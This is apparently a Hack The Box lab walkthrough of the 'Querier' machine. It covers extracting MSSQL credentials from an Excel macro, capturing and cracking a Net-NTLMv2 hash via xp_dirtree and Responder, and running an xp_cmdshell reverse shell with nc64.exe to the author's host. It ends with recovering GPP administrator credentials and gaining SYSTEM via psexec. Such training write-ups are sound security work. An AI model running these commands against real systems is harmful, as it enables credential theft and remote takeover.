---
title: Hack The Box - Querier
date: 2023-02-05
categories: [hackthebox]
tags: [smbclient,olevba,impacket-mssqlclient,impacket-psexec,impacket-mssqlclient,xp-dirtree,hashcat,medium]
comments: true
toc: true
---
<img src="/assets/Hackthebox/Querier/0.png"  width="90%" height="70%">

Querier was a medium box that involved retrieving MSSQL database credentials after analyzing
macro-enabled Excel workbook. These credentials were then used to establish a connection to the MSSQL database via
impacket-mssqlclient as a limited user through which we obtain the NEt-NTLMv2 hash from the responder.
PowerUp.ps1 then retrieved administrator credentials from a GPP file, and we got the shell as administrator.

### NMAP

`Nmap` scan shows multiple open ports, including a Microsoft SQL Server 2017
```bash
$sudo nmap -p- -sC -sV --min-rate 10000 -oN querier.nmap 10.10.10.125
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-04 19:46 +0545
Nmap scan report for 10.10.10.125
Host is up (0.070s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-04T13:59:11
|_Not valid after:  2053-02-04T13:59:11
|_ssl-date: 2023-02-04T14:02:33+00:00; -11s from scanner time.
5005/tcp  filtered avt-profile-2
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
26583/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
51547/tcp filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-02-04T14:02:24
|_  start_date: N/A
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: -11s, deviation: 0s, median: -12s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.01 seconds
```

### SMB ENUMERATION

Using `smbclient` null authentication to list down shares. 
```bash
 $smbclient -N -L //10.10.10.125

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk
SMB1 disabled -- no workgroup available
```
Inside the `Reports` share, there's a single file `Currency Volume Report.xlsm`
```bash
$smbclient //10.10.10.125/Reports 
Password for [WORKGROUP\niraz]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan 29 05:08:48 2019
  ..                                  D        0  Tue Jan 29 05:08:48 2019
  Currency Volume Report.xlsm         A    12229  Mon Jan 28 04:06:34 2019

                5158399 blocks of size 4096. 848080 blocks available
```
Downloading the report to our local machine.

```bash
$smbclient -N //10.10.10.125/Reports 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan 29 05:08:48 2019
  ..                                  D        0  Tue Jan 29 05:08:48 2019
  Currency Volume Report.xlsm         A    12229  Mon Jan 28 04:06:34 2019

                5158399 blocks of size 4096. 852223 blocks available
smb: \> mget *
Get file Currency Volume Report.xlsm? y
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (35.5 KiloBytes/sec) (average 35.5 KiloBytes/sec)

```

### ANALYSIS OF CURRENCY VOLUME REPORT.XLSM

A `.xlsm` file is a type of Microsoft Excel workbook that contains `macros`.We can use `olevba` to analyse this file.
```
$olevba Currency\ Volume\ Report.xlsm
olevba 0.60 on Python 3.9.2 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"

  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

### EASTABLISHING MSSQL CONNECTION THROUGH MSSQLCLIENT

we cab use `mssqlclient.py` from impacket to connect to the database.
```bash
$python3 mssqlclient.py reporting@10.10.10.125 -windows-auth
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```

once connected, we can now run query to the database.
```sql
SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name    subentity_name    permission_name
------------   ---------------   ------------------
server                           CONNECT SQL
server                           VIEW ANY DATABASE
```

```sql
SQL> SELECT name FROM master.sys.databases
name
-------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
volume
```

`xp_dirtree` is a stored procedure in Microsoft SQL Server that provides a way to retrieve a list of files and directories within a specified directory path. We'll use xp_dirtee to load a file from our SMB share. This way, Net-NTLMv2 hash will be captured by the `responder` when the server tries to authenticate to my host.

```sql
SQL> xp_dirtree '\\10.10.14.11\test';
subdirectory    depth
-------------   -----------
```


```
$sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.11]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-080BVO53VJ6]
    Responder Domain Name      [5LWK.LOCAL]
    Responder DCE-RPC Port     [45564]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:d02ec612c5a555b3:9F5C20033BF0D5C395F84B10229DFBDC:01010000000000008098843AD838D9018AAD0038DFFC50E7000000000200080035004C0057004B0001001E00570049004E002D00300038003000420056004F003500330056004A00360004003400570049004E002D00300038003000420056004F003500330056004A0036002E0035004C0057004B002E004C004F00430041004C000300140035004C0057004B002E004C004F00430041004C000500140035004C0057004B002E004C004F00430041004C00070008008098843AD838D901060004000200000008003000300000000000000000000000003000005E3D6425BEDABAD60351015493021F33D9FAB339BE7DCAF0634896891740263D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
```

CRACK NetNTMLv2 

using `hashcat` to crack `NetNTMLv2` hash.

```
$hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

MSSQL-SVC::QUERIER:d02ec612c5a555b3:9f5c20033bf0d5c395f84b10229dfbdc:01010000000000008098843ad838d9018aad0038dffc50e7000000000200080035004c0057004b0001001e00570049004e002d00300038003000420056004f003500330056004a00360004003400570049004e002d00300038003000420056004f003500330056004a0036002e0035004c0057004b002e004c004f00430041004c000300140035004c0057004b002e004c004f00430041004c000500140035004c0057004b002e004c004f00430041004c00070008008098843ad838d901060004000200000008003000300000000000000000000000003000005e3d6425bedabad60351015493021f33d9fab339be7dcaf0634896891740263d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000:corporate568


Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: MSSQL-SVC::QUERIER:d02ec612c5a555b3:9f5c20033bf0d5c...000000
Time.Started.....: Sat Feb  4 20:43:12 2023 (15 secs)
Time.Estimated...: Sat Feb  4 20:43:27 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   585.4 kH/s (4.70ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8962048/14344385 (62.48%)
Rejected.........: 0/8962048 (0.00%)
Restore.Point....: 8957952/14344385 (62.45%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: correita.54 -> coreyr1

Started: Sat Feb  4 20:42:19 2023
Stopped: Sat Feb  4 20:43:29 2023
```

### LOG IN AS MSSQL-SRV

we can now login as  `mssql-svc` account with username `mssql-src` and password `corporate568`
```bash
$python3 mssqlclient.py MSSQL-SVC@10.10.10.125 -windows-auth
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>
```
while trying to run commands, it didnot let us run commands as `xp_cmdshell` was not enabled.
```
SQL> xp_cmdshell whoami
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```
we can use `enable_xp_cmdshell` that enable us to run commands.
```
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami
output

--------------------------------------------------------------------------------

querier\mssql-svc
```

### SHELL AS MSSQL-SVC

To get shell on the box, we'll host nc64.exe binary on our smb server. we are also hosting `PowerUp.ps1` which we'll use later for enumeration.
```bash
$ls
nc64.exe   PowerUp.ps1
$sudo impacket-smbserver share . -smb2support
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.125,49696)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User QUERIER\mssql-svc authenticated successfully
[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:0c02ceff915f9f1f61f3318245331ed6:010100000000000080b309290d39d9016e147c741a2f604b00000000010010007200670053006f007200490070005900030010007200670053006f00720049007000590002001000620052006e005300690071005800620004001000620052006e00530069007100580062000700080080b309290d39d901060004000200000008003000300000000000000000000000003000005e3d6425bedabad60351015493021f33d9fab339be7dcaf0634896891740263d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000
```
now, again we will use `xp_cmdshell`, this time it will execute nc64.exe from our smbserver. we will also start a nc listener on our box .
```bash
$sudo impacket-mssqlclient MSSQL-SVC@10.10.10.125 -windows-auth
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell \\10.10.14.11\share\nc64.exe -e cmd.exe 10.10.14.11 4444 
output
```
and we got the shell as mssql-svc.
```bash
$sudo rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.125] 49697
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
querier\mssql-svc
```

### SHELL AS ADMINISTRATOR

Downloading `PowerUp.ps1` on the box.
```
C:\Users\mssql-svc\Desktop>copy \\10.10.14.11\share\PowerUp.ps1
```
switching our shell to `powershell`.
```
C:\Windows\system32> powershell 
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Users\mssql-svc\Desktop>
```
importing `PowerUp.ps1`
```
PS C:\Users\mssql-svc\Desktop>. .\PowerUp.ps1
```
now we can run `Invoke-AllChecks` 
```
PS C:\Users\mssql-svc\Desktop> Invoke-AllChecks 


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2132
ProcessId   : 3316
Name        : 3316
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```
Here, we got credentials for `administratror` through `Groups.xml`

using `impacket-psexec` to login to the `administrator` user.
```bash
$sudo impacket-psexec administrator@10.10.10.125
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

Password:
[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file OlkQmibA.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service rDqZ on 10.10.10.125.....
[*] Starting service rDqZ.....
[!] Press help for extra shell commands                                                                                                                           Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami                  
nt authority\system


C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
0def3d8ef83671c3a7aa76c58626ead1
```

